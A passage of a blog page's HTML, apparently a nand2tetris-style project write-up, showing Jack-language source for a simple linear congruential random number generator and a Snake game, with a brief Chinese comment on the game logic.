class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Random Number Generator</span></span><br><span class="line"><span class="comment">Original author: Taylor Wacker</span></span><br><span class="line"><span class="comment">Modified by: Connor McKay</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This is a pseudo random number generator that uses the</span></span><br><span class="line"><span class="comment">Linear Congruential Generator (LCG) to generate random</span></span><br><span class="line"><span class="comment">numbers.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Random</span> </span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> x;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Sets a new seed value.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">function <span class="keyword">void</span> <span class="title">seed</span><span class="params">(<span class="keyword">int</span> seed)</span> </span>&#123;</span><br><span class="line">let x = seed;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Returns a mod b. b must be positive.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">function <span class="keyword">int</span> <span class="title">mod</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (a &lt; <span class="number">0</span>) &#123;</span><br><span class="line">let a = -a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((a + <span class="number">1</span>) &gt; b) &#123;</span><br><span class="line">let a = a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Returns the next random number. Can be negative or positive.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">function <span class="keyword">int</span> <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">let x = Random.mod(<span class="number">7919</span> + (<span class="number">17</span>*x),<span class="number">7919</span>);</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Returns a random value between x (inclusive) and y (non-inclusive).</span></span><br><span class="line"><span class="comment">y must be greater than x.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">function <span class="keyword">int</span> <span class="title">between</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="keyword">int</span> diff;</span><br><span class="line">let diff = y - x;</span><br><span class="line"><span class="keyword">return</span> Random.mod(Random.next(), diff) + x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>游戏的逻辑主体部分，不过写的过于复杂点了，其实还可以写的更简单一些，或者完成俄罗斯方块游戏之类的。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GluttonousSnake */</span></span><br><span class="line"><span class="comment">/* created by mike meng @ 2020.10.3</span></span><br><span class="line"><span class="comment">*  email: mml1106@126.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Snake</span> </span>&#123;</span><br><span class="line">   field <span class="keyword">int</span> row;<span class="comment">//</span></span><br><span class="line">   field <span class="keyword">int</span> col;<span class="comment">//width</span></span><br><span class="line">   field <span class="keyword">int</span> bsize;<span class="comment">//square size</span></span><br><span class="line">   field Array head; <span class="comment">/*snake Queuehead*/</span></span><br><span class="line">   field Queue foods; <span class="comment">/*current foods*/</span></span><br><span class="line">   field <span class="keyword">int</span> foodCount; <span class="comment">// food number count</span></span><br><span class="line">   field Queue body; <span class="comment">// current snake body;</span></span><br><span class="line">   field <span class="keyword">int</span> speed; <span class="comment">//snake speed</span></span><br><span class="line">   field Array mask;<span class="comment">// direction mask</span></span><br><span class="line">   field <span class="keyword">int</span> direction; <span class="comment">/*-1: none, 0: up, 1: right, 2 : down, 3 : left*/</span></span><br><span class="line">   field <span class="keyword">int</span> state;  <span class="comment">//current state;</span></span><br><span class="line">   field <span class="keyword">int</span> score;  <span class="comment">//current score;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Constructs a new square with a given location and size. */</span></span><br><span class="line">   <span class="function">constructor Snake <span class="title">new</span><span class="params">(<span class="keyword">int</span> w,<span class="keyword">int</span> h)</span></span>&#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> i;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> val;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*matrix height &amp; width*/</span></span><br><span class="line">      let row = h;</span><br><span class="line">      let col = w;</span><br><span class="line">      let bsize = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*game state: 0: runing, 1: game over*/</span></span><br><span class="line">      let state = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*snake head*/</span></span><br><span class="line">      let head = Array.new(<span class="number">2</span>);</span><br><span class="line">      let head[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      let head[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="function"><span class="keyword">do</span> <span class="title">drawBlock</span><span class="params">(<span class="number">0</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*snake foods*/</span></span><br><span class="line">      let foods = Queue.new(<span class="number">100</span>);</span><br><span class="line">      let i = <span class="number">20</span>;</span><br><span class="line">      <span class="keyword">do</span> Random.seed(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">while</span>(~(i = <span class="number">0</span>))&#123;</span><br><span class="line">         let val = Snake.mod(Random.next(),row*col);</span><br><span class="line">         <span class="keyword">do</span> foods.push_back(val);</span><br><span class="line">         <span class="comment">//do Snake.debug(val);</span></span><br><span class="line">         <span class="function"><span class="keyword">do</span> <span class="title">drawFood</span><span class="params">(val)</span></span>;</span><br><span class="line">         let i = i - <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/*snake body*/</span></span><br><span class="line">      let body = Queue.new(row*col);</span><br><span class="line">      <span class="keyword">do</span> body.push_back(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*snake direction*/</span></span><br><span class="line">      <span class="comment">/*-1: none, 0: up, 1: right, 2 : down, 3 : left*/</span></span><br><span class="line">      let mask = Array.new(<span class="number">5</span>);</span><br><span class="line">      let direction = <span class="number">1</span>;</span><br><span class="line">      let mask[<span class="number">0</span>] = -<span class="number">1</span>;</span><br><span class="line">      let mask[<span class="number">1</span>] =  <span class="number">0</span>;</span><br><span class="line">      let mask[<span class="number">2</span>] =  <span class="number">1</span>;</span><br><span class="line">      let mask[<span class="number">3</span>] =  <span class="number">0</span>;</span><br><span class="line">      let mask[<span class="number">4</span>] = -<span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">      <span class="comment">/*snake score*/</span></span><br><span class="line">      let score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Disposes this square. */</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">dispose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">do</span> head.dispose();</span><br><span class="line">      <span class="keyword">do</span> foods.dispose();</span><br><span class="line">      <span class="keyword">do</span> body.dispose();</span><br><span class="line">      <span class="keyword">do</span> mask.dispose();</span><br><span class="line">      <span class="keyword">do</span> Memory.deAlloc(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*math  mod function*/</span></span><br><span class="line">   <span class="function">function <span class="keyword">int</span> <span class="title">mod</span><span class="params">(<span class="keyword">int</span> m,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> (m - ((m/n)*n));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** game is over**/</span></span><br><span class="line">   <span class="function">method <span class="keyword">boolean</span> <span class="title">isOver</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> state = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** snake move up **/</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">moveUp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(direction = <span class="number">2</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">      let direction = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/** snake move down **/</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">moveDown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(direction = <span class="number">0</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">      let direction = <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** snake move left **/</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">moveLeft</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(direction = <span class="number">1</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">      let direction = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** snake move right **/</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">moveRight</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(direction = <span class="number">3</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">      let direction = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*draw a block*/</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">drawBlock</span><span class="params">(<span class="keyword">int</span> rx,<span class="keyword">int</span> cx)</span></span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawRectangle(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*erase a block*/</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">eraseBlock</span><span class="params">(<span class="keyword">int</span> location)</span></span>&#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> rx;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> cx;</span><br><span class="line"></span><br><span class="line">      let rx = location/col;</span><br><span class="line">      let cx = Snake.mod(location,col);</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="keyword">false</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawRectangle(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*debug*/</span></span><br><span class="line">   <span class="function">function <span class="keyword">void</span> <span class="title">debug</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Output.moveCursor(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">do</span> Output.printInt(x);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*draw a food*/</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">drawFood</span><span class="params">(<span class="keyword">int</span> location)</span></span>&#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> rx;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> cx;</span><br><span class="line"></span><br><span class="line">      let rx = location/col;</span><br><span class="line">      let cx = Snake.mod(location,col);</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>+<span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>+<span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*draw snake head*/</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">drawHead</span><span class="params">(<span class="keyword">int</span> rx,<span class="keyword">int</span> cx)</span></span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span> + <span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(cx*<span class="number">16</span>+<span class="number">15</span>,(rx+<span class="number">2</span>)*<span class="number">16</span>,cx*<span class="number">16</span>,(rx+<span class="number">2</span>)*<span class="number">16</span> + <span class="number">15</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*snake move one step*/</span></span><br><span class="line">   <span class="function">method <span class="keyword">boolean</span> <span class="title">move</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> x;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> y;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> i;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> val;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> rx;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> cx;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">boolean</span> eat;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(isOver())&#123; <span class="keyword">return</span> <span class="keyword">false</span>;&#125;</span><br><span class="line">      <span class="keyword">if</span>(direction &lt; <span class="number">0</span>)&#123; <span class="keyword">return</span> <span class="keyword">true</span>;&#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/*get the current move location*/</span></span><br><span class="line">      let x = head[<span class="number">0</span>] + mask[direction];</span><br><span class="line">      let y = head[<span class="number">1</span>] + mask[direction + <span class="number">1</span>];</span><br><span class="line">      let i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*check the snake will touch the edge*/</span></span><br><span class="line">      <span class="keyword">if</span>((x &lt; <span class="number">0</span>)|(y &lt; <span class="number">0</span>)|(x = row)|(y = col))&#123;</span><br><span class="line">         let state = <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*check the snake will touch the body*/</span></span><br><span class="line">      let i = body.size();</span><br><span class="line">      <span class="keyword">while</span>(~(i = <span class="number">0</span>))&#123;</span><br><span class="line">         let val = body.pop_front();</span><br><span class="line">         let i = i - <span class="number">1</span>;</span><br><span class="line">         let rx = val/col;</span><br><span class="line">         let cx = Snake.mod(val,col);</span><br><span class="line">         <span class="keyword">if</span>((rx = x) &amp; (cx = y))&#123;</span><br><span class="line">            let state = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">do</span> body.push_back(val);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(isOver())&#123; <span class="keyword">return</span> <span class="keyword">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*check the snake touch the foods*/</span></span><br><span class="line">      let i = foods.size();</span><br><span class="line">      <span class="keyword">while</span>(~(i = <span class="number">0</span>))&#123;</span><br><span class="line">         let i = i - <span class="number">1</span>;</span><br><span class="line">         let val = foods.pop_front();</span><br><span class="line">         let rx = val/col;</span><br><span class="line">         let cx = Snake.mod(val,col);</span><br><span class="line">         <span class="keyword">if</span>((rx = x) &amp; (cx = y))&#123;</span><br><span class="line">            let eat = <span class="keyword">true</span>;</span><br><span class="line">            let score = score + <span class="number">1</span>;</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">do</span> foods.push_back(val);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*move snake one step*/</span></span><br><span class="line">      let head[<span class="number">0</span>] = x;</span><br><span class="line">      let head[<span class="number">1</span>] = y;</span><br><span class="line">      <span class="function"><span class="keyword">do</span> <span class="title">drawBlock</span><span class="params">(x,y)</span></span>;</span><br><span class="line">      <span class="keyword">do</span> body.push_front(x*col + y);</span><br><span class="line">      <span class="keyword">if</span>(~eat)&#123;</span><br><span class="line">         <span class="function"><span class="keyword">do</span> <span class="title">eraseBlock</span><span class="params">(body.pop_back()</span>)</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="comment">/*we can produce a random food for the snake*/</span></span><br><span class="line">         <span class="comment">//do prodFood();</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">method <span class="keyword">int</span> <span class="title">prodFood</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">boolean</span> valid;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> location;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> val;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">      let valid = <span class="keyword">false</span>;</span><br><span class="line">      <span class="keyword">while</span>(~valid)&#123;</span><br><span class="line">         let location = Snake.mod(Random.next(),row*col);</span><br><span class="line">         let i = body.size();</span><br><span class="line">         let valid = <span class="keyword">true</span>;</span><br><span class="line">         <span class="keyword">while</span>(~(i=<span class="number">0</span>))&#123;</span><br><span class="line">            let val = body.pop_front();</span><br><span class="line">            <span class="keyword">do</span> body.push_back(val);</span><br><span class="line">            <span class="keyword">if</span>(val = location)&#123;</span><br><span class="line">               let valid = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125; </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">do</span> <span class="title">drawFood</span><span class="params">(location)</span></span>;</span><br><span class="line">      <span class="keyword">do</span> foods.push_back(location);</span><br><span class="line">      <span class="keyword">return</span> location;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*get the game score*/</span></span><br><span class="line">   <span class="function">method <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> score;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 